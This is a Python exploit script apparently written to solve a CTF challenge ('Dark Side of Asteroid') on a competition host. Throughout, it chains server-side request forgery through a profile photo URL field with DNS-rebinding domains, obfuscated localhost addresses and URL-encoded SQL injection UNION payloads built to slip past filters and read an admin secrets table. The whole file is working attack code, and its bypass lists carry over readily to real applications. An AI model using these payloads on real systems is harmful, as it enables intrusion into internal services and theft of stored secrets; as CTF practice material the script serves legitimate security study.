#!/usr/bin/env python3
import requests
import urllib.parse
import time

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "hacker2"
    password = "hacker123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def exploit():
    """Advanced exploit using DNS rebinding and SQL injection bypasses"""
    print("[+] Dark Side of Asteroid - Advanced Exploit")
    print("[+] =======================================")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Method 1: DNS Rebinding Bypass
    # Use a domain that initially resolves to a public IP, then rebinds to localhost
    dns_rebinding_urls = [
        "http://127.0.0.1.nip.io:5000/internal/admin/search",
        "http://127.0.0.1.xip.io:5000/internal/admin/search", 
        "http://127.0.0.1.1time.org:5000/internal/admin/search",
        "http://127.0.0.1.10min.org:5000/internal/admin/search",
        "http://127.0.0.1.60min.org:5000/internal/admin/search",
        "http://127.0.0.1.2ip.org:5000/internal/admin/search",
        "http://127.0.0.1.4ip.org:5000/internal/admin/search",
    ]
    
    # Method 2: URL Encoding and Case Bypass for SQL Injection
    # The filter checks for lowercase, but we can use URL encoding
    sql_payloads = [
        # URL encoded versions to bypass the blacklist
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        "access_level%27%20OR%20access_level=3--",
        "access_level%27%20AND%20access_level<=3--",
        # Using different encoding
        "access_level%2527%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        # Using hex encoding
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets--",
        # Try to bypass the access_level <= 2 restriction
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level>2--",
        "access_level%27%20UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level>=3--",
    ]
    
    print("[+] Testing DNS rebinding bypass...")
    
    for base_url in dns_rebinding_urls:
        print(f"[*] Trying DNS rebinding: {base_url}")
        
        for sql_payload in sql_payloads:
            full_url = f"{base_url}?q={sql_payload}"
            
            print(f"[*] Testing: {full_url}")
            
            data = {'photo_url': full_url}
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=15)
                
                if response.status_code == 200:
                    # Check for flag in response
                    if "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag!")
                        print(f"[+] Response: {response.text}")
                        return
                    
                    # Check error preview
                    if "Failed to render as image" in response.text:
                        start = response.text.find("<pre>")
                        end = response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = response.text[start+5:end]
                            if "COMPFEST" in preview or "Flag" in preview:
                                print(f"[+] SUCCESS! Found flag in error preview!")
                                print(f"[+] Preview: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview[:200]}")
                
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
    
    print("[-] DNS rebinding failed. Trying alternative methods...")
    
    # Method 3: Try different localhost representations that might bypass the check
    localhost_variants = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://localhost:5000/internal/admin/search",
        "http://0.0.0.0:5000/internal/admin/search",
        "http://0177.0.0.1:5000/internal/admin/search",  # Octal
        "http://2130706433:5000/internal/admin/search",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search",  # Hex
        "http://017700000001:5000/internal/admin/search",  # Combined octal
        "http://127.1:5000/internal/admin/search",  # Shortened
        "http://127.0.1:5000/internal/admin/search",  # Alternative
        # Try with different ports
        "http://127.0.0.1:80/internal/admin/search",
        "http://127.0.0.1:8080/internal/admin/search",
        "http://127.0.0.1:3000/internal/admin/search",
        "http://127.0.0.1:8000/internal/admin/search",
    ]
    
    # Method 4: Try to exploit the SQL injection without spaces (using URL encoding)
    no_space_sql_payloads = [
        "access_level%27UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets%20WHERE%20access_level=3--",
        "access_level%27OR%20access_level=3--",
        "access_level%27AND%20access_level<=3--",
        "access_level%27UNION%20SELECT%20secret_name,secret_value%20FROM%20admin_secrets--",
    ]
    
    print("[+] Testing localhost variants with no-space SQL injection...")
    
    for base_url in localhost_variants:
        print(f"[*] Trying: {base_url}")
        
        for sql_payload in no_space_sql_payloads:
            full_url = f"{base_url}?q={sql_payload}"
            
            data = {'photo_url': full_url}
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                
                if response.status_code == 200:
                    if "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag!")
                        print(f"[+] Response: {response.text}")
                        return
                    
                    if "Failed to render as image" in response.text:
                        start = response.text.find("<pre>")
                        end = response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = response.text[start+5:end]
                            if "COMPFEST" in preview or "Flag" in preview:
                                print(f"[+] SUCCESS! Found flag in error preview!")
                                print(f"[+] Preview: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview[:200]}")
                
            except Exception as e:
                continue
    
    print("[-] All methods failed.")

if __name__ == "__main__":
    exploit()
